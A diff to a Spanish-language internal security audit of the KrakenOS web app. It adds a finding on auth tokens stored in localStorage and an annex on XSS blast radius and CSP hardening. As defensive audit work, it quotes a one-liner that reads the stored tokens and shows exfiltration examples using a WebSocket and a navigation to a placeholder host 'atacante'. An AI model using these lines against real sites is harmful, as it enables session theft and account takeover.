@@ -167,6 +167,7 @@ por una verificación e2e.
 | **F10** | 🟡 | **Ventana de primer admin.** `/setup/init` es público mientras no haya usuarios; el primer cliente que alcance el agente recién instalado reclama el admin (sin token out-of-band). | `setup.routes.ts:21-58` | "Admin por el wizard /setup" (CLAUDE.md) | Atómico contra carreras (US-53) ✔, pero no autentica el *primer* arranque. |
 | **F11** | 🟡 | **Auditoría best-effort.** Un fallo de escritura sólo emite `log.warn`; eventos de seguridad (`login_failed`, `device.block`) pueden perderse bajo presión de DB. El `detail` guarda el email de logins fallidos (PII). | `audit.ts:26-45` | "Toda acción relevante queda registrada" (SPECS §9) | Best-effort, no transaccional; truncado a 1 KB (US-58) ✔. |
 | **F12** | 🟡 | **Patrón IP/CIDR laxo.** El IPv4 no acota octetos (acepta `999.999.999.999`) y el IPv6 es permisivo. `execFile` evita el shell y el patrón bloquea el `-` inicial, así que la inyección de argumentos a `iptables` está mitigada, pero la validación no es estricta. | `firewall.schemas.ts` (`IP_CIDR_PATTERN`) | "se validan como IP/CIDR (defensa frente a inyección…)" (SPECS §9) | Defensa real (sin shell + sin `-` inicial) ✔; el patrón en sí es flojo. **Nunca fuzzeado.** |
+| **F13** | 🔴 | **Access + refresh token en `localStorage` (legibles por JS).** El store usa `zustand/persist({name:'krakenos-auth'})` → ambos tokens quedan en `localStorage`. Un XSS lee el refresh (30 días) → **toma de cuenta persistente**. Mitigado parcialmente en US-90 (CSP); el arreglo real (cookie httpOnly) queda en US-91. | `web/src/store/auth.store.ts:62-107` | "JWT… refresh persistido solo como hash" (SPECS §9 — sólo en el servidor) | En el **cliente** ambos tokens son legibles por JS. Ver Anexo (§7). |
 
 ### Controles verificados como correctos (no son hallazgos)
 - **Sin `alg:none`**: la verificación fija `algorithms:['RS256']` y `allowedIss`/`allowedAud` (`auth.ts:89,103-108`); el `kid` sólo elige clave pública, nunca el algoritmo. ✔
@@ -229,6 +230,90 @@ por una verificación e2e.
 
 ---
 
+## 7. Anexo (US-90) — Almacenamiento de tokens en el cliente y radio de impacto de XSS
+
+Revisión del cliente web (`apps/web/src/store/auth.store.ts`, `lib/api.ts`, `lib/socket.ts`).
+
+### 7.1 Dónde viven exactamente los tokens
+
+| Token | Vida | Ubicación real |
+|---|---|---|
+| **access** | 15 min (def.) | Estado de Zustand (memoria) **y `localStorage`** |
+| **refresh** | 30 días, rotatorio | Estado de Zustand (memoria) **y `localStorage`** |
+
+El store usa `zustand/persist` con `{ name: 'krakenos-auth' }` y **storage por defecto =
+`localStorage`** (`auth.store.ts:62-107`). No hay `partialize`, así que se persiste todo el
+estado: `user` + `tokens.{accessToken, refreshToken, expiresIn}`. En claro, bajo la clave
+`krakenos-auth`. `lib/api.ts` lee `accessToken` del store y lo manda como `Authorization:
+Bearer`; `lib/socket.ts` lo manda en el handshake; `auth.store.refresh()/logout()` leen el
+`refreshToken` del store y lo mandan en el **cuerpo** de `POST /auth/refresh|logout`.
+**No se usa ninguna cookie** para la sesión.
+
+### 7.2 Radio de impacto de un XSS (si el atacante ejecuta JS en el origen)
+
+```js
+JSON.parse(localStorage['krakenos-auth']).state.tokens
+// → { accessToken (15 min), refreshToken (30 días), expiresIn }
+```
+
+- **Refresh token = joya de la corona:** credencial **persistente de 30 días** que acuña
+  access tokens a voluntad. Robado, da **toma de cuenta completa y duradera**, usable
+  **fuera del navegador** (offline, desde cualquier sitio), y **sobrevive a la rotación**
+  (el atacante rota a su favor; el legítimo se desloguea, F4).
+- **Importante y honesto:** mover los tokens a memoria (sin `persist`) **no** detiene a un XSS
+  *en vivo* — JS puede leer la memoria de JS (`useAuthStore.getState()`). Sólo
+  quita la copia *en reposo* (tras recargar / pestaña nueva). La **única** forma de que el
+  refresh sea ilegible por JS es sacarlo de JS: **cookie `httpOnly`**.
+
+### 7.3 Evaluación de la CSP actual (`plugins/security-headers.ts`) frente a esto
+
+| Directiva | Veredicto |
+|---|---|
+| `script-src 'self'` (sin `unsafe-inline`/`eval`) | **Bien.** Corta el vector principal de XSS (inline/eval/script externo). Residual: dependencia vulnerable o sink DOM. |
+| `img-src 'self' data: blob:` | Bien — sin host externo ⇒ no hay exfil por `new Image().src`. |
+| `connect-src 'self' ws: wss:` *(antes)* | **Agujero.** El comodín `ws:/wss:` permitía `new WebSocket('wss://atacante')` ⇒ **canal de exfiltración** del token desde un XSS. |
+| `style-src 'unsafe-inline'` | Necesario (React/Recharts); se mantiene. |
+
+**Implementado en US-90:** `connect-src 'self'` (quitados `ws:/wss:`; en CSP3 `'self'` cubre el
+WebSocket del mismo origen) + `frame-src 'none'`. Con `connect-src 'self'` un XSS **ya no puede
+exfiltrar** el token por `fetch`/XHR/WebSocket/beacon a un host externo (la app es local-first,
+sin destinos externos legítimos).
+
+**Límite honesto de la CSP:** sigue **sin** ser contención total. La CSP **no** impide (a) el
+**abuso en-página** de la sesión (un XSS llama la API al mismo origen con el token), ni (b) la
+exfiltración por **navegación de nivel superior** (`location = 'https://atacante/?'+token`, que no
+gobierna `connect-src` y para la que `navigate-to` está deprecada). Por eso la CSP es **mitigación
+en profundidad**, no la solución: mientras el refresh sea legible por JS, el riesgo residual es alto.
+
+### 7.4 Decisión: por qué la cookie `httpOnly` se difiere (y no se hace ahora)
+
+El arreglo correcto es **refresh en cookie `httpOnly`+`SameSite` + access sólo en memoria**, pero
+es **demasiado invasivo para un cambio acotado y de bajo riesgo** porque toca, de forma transversal:
+
+1. **Cuatro emisores de sesión** (`auth/login`, `setup/init`, `webauthn authenticate/verify`,
+   `backup-codes/verify`) deben **fijar la cookie**, además de `auth/refresh`.
+2. El **contrato por cuerpo** de `auth/refresh` y `auth/logout` (hoy reciben `refreshToken` en el
+   body) cambia a leer de cookie → afecta schemas y **~28 referencias en tests**.
+3. La función **"cerrar otras sesiones manteniendo la actual"** (US-41) pasa hoy el
+   `keepRefreshToken` desde el cliente; con la cookie `httpOnly` el cliente ya no lo conoce →
+   hay que reidentificar la sesión actual por la cookie (rediseño).
+4. **Frontend:** dejar de persistir tokens + **arranque con `refresh()` por cookie al cargar**
+   (hoy la sesión sobrevive a la recarga vía `localStorage`).
+5. **`Secure` condicional** (dev es HTTP en `:5173` con proxy de Vite → mismo origen; prod puede ser
+   HTTPS) y **postura CSRF** nueva (la cookie viaja sola ⇒ `SameSite=Lax/Strict` + posible token CSRF).
+
+Es una historia propia, no un retoque. Hacerla aquí arriesga romper US-41 y dejar tests en rojo.
+
+### 7.5 Veredicto y seguimiento
+
+- **Hecho ahora (US-90, bajo riesgo):** CSP `connect-src 'self'` + `frame-src 'none'` → cierra la
+  exfiltración off-origin del token. **Reduce** el radio de impacto, **no lo elimina**.
+- **Pendiente (US-91 · 🔴, F13):** refresh token en cookie `httpOnly`+`SameSite`+`Secure`(condicional),
+  access token sólo en memoria con bootstrap `refresh()` al cargar, rediseño de `keepRefreshToken`
+  por cookie y postura CSRF. Es **la** medida que hace el refresh ilegible por JS.
+
+---
+
 > _Este documento es interno a la auditoría de seguridad; describe la postura a junio de 2026
-> sobre el código de las US-01…US-72. Cualquier remediación se implementa en su propia US y se
-> reconcilia con `SPECS §9` y `CLAUDE.md` al cerrarse._
+> sobre el código de las US-01…US-72 (y anexos US-90). Cualquier remediación se implementa en su
+> propia US y se reconcilia con `SPECS §9` y `CLAUDE.md` al cerrarse._
